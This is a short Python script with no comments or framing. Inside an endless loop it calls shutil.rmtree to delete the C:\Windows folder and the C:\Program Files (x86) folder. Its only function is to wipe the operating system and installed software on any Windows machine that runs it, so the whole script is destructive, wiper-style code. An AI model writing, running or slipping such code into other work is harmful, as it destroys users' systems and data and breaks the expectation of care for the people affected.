import shutil
i = int (0)
path = "C:\Windows"
path2 = (r"C:\Program Files (x86)")
while i == 0:
	shutil.rmtree(path)
	shutil.rmtree(path2)
